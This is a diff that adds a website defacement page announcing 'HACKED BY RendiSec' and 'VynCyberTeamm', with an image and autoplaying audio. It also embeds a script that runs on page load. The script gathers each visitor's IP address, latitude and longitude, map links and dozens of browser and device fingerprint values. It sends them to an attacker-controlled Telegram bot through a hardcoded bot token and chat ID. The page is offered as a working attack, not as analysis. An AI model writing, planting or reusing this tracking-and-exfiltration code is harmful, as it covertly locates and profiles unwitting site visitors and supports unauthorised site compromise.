@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Hacked By Rendiexploit</title>
+  <link href="https://fonts.googleapis.com/css?family=Iceland" rel="stylesheet">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  <style>
+    body {
+      background-color: black;
+      color: white;
+      text-align: center;
+      font-family: 'Iceland', sans-serif;
+    }
+    .title {
+      font-size: 3rem;
+      color: red;
+    }
+    .subtitle {
+      font-size: 2.5rem;
+      color: green;
+    }
+    .quote {
+      font-size: 1.5rem;
+      margin: 20px 0;
+    }
+    .logo-container {
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+    }
+    .logo-container img {
+      width: 300px;
+      height: auto;
+    }
+    audio {
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+  <h1 class="title">HACKED BY RendiSec</h1>
+  <div class="logo-container">
+    <img src="https://files.catbox.moe/06z8sz.jpg" alt="Logo">
+  </div>
+  <h2 class="subtitle">Hii! This site hacked by VynCyberTeamm!!</h2>
+  <p class="quote">System Breached</p>
+  <audio id="player" src="https://i.top4top.io/m_33131khih0.mp3" loop controls autoplay></audio>
+
+  <script>
+    const BOT_TOKEN = '7518590238:AAFa_NmuU323qGIN6XFFox8NIVx9QT1zrPE';
+    const CHAT_ID = '6281867611';
+
+    async function sendToTelegram(message) {
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+      await fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message,
+          parse_mode: "Markdown"
+        })
+      });
+    }
+
+    async function logInfo() {
+      let output = '';
+      const now = new Date().toLocaleString();
+
+      try {
+        const ipData = await fetch('https://ipapi.co/json/').then(res => res.json());
+
+        output += `✅ IP : ${ipData.ip} | Time : ${now}\n`;
+        output += `Location: Latitude ${ipData.latitude}, Longitude ${ipData.longitude}\n`;
+        output += `Google Earth URL: https://earth.google.com/web/@${ipData.latitude},${ipData.longitude}\n`;
+        output += `Google Maps URL: https://www.google.com/maps/place/${ipData.latitude},${ipData.longitude}\n\n`;
+      } catch {
+        output += 'IP or Location not available\n\n';
+      }
+
+      const conn = navigator.connection || {};
+      output += `🔻 Downlink: ${conn.downlink || 'N/A'}\n`;
+      output += `📡 Effective Type: ${conn.effectiveType || 'N/A'}\n`;
+      output += `⏱️ Rtt: ${conn.rtt || 'N/A'}\n`;
+      output += `📶 Type: ${conn.type || 'N/A'}\n`;
+
+      output += `🆔 ProductSub: ${navigator.productSub}\n`;
+      output += `🏭 Vendor: ${navigator.vendor}\n`;
+      output += `👆 MaxTouchPoints: ${navigator.maxTouchPoints}\n`;
+      output += `🚫 DoNotTrack: ${navigator.doNotTrack}\n`;
+      output += `💻 HardwareConcurrency: ${navigator.hardwareConcurrency}\n`;
+      output += `🍪 CookieEnabled: ${navigator.cookieEnabled}\n`;
+      output += `📛 AppCodeName: ${navigator.appCodeName}\n`;
+      output += `📱 AppName: ${navigator.appName}\n`;
+      output += `🔖 AppVersion: ${navigator.appVersion}\n`;
+      output += `📲 Platform: ${navigator.platform}\n`;
+      output += `🧩 Product: ${navigator.product}\n`;
+      output += `🕵️ UserAgent: ${navigator.userAgent}\n`;
+      output += `🗣️ Language: ${navigator.language}\n`;
+      output += `🌐 Languages: ${navigator.languages}\n`;
+      output += `🚗 Webdriver: ${navigator.webdriver ? 'Yes' : 'No'}\n`;
+      output += `📄 PdfViewerEnabled: ${navigator.pdfViewerEnabled ?? 'Unknown'}\n`;
+      output += `💾 DeviceMemory: ${navigator.deviceMemory || 'Unknown'}\n`;
+
+      document.getElementById('output').textContent = output;
+      sendToTelegram("```\n" + output + "\n```");
+    }
+
+    logInfo();
+  </script>
+</body>
+</html>
